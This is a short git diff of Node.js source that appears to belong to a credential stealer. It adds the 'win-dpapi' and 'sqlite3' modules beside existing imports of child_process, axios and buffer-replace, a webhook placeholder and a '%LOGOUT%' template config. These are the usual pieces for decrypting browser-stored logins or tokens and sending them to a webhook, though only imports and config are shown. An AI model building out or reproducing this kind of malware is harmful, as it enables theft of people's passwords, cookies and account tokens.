@@ -7,6 +7,8 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
+const dpapi = require("win-dpapi");
+const sqlite3 = require('sqlite3');
 
 const config = {
     "logout": "%LOGOUT%1",
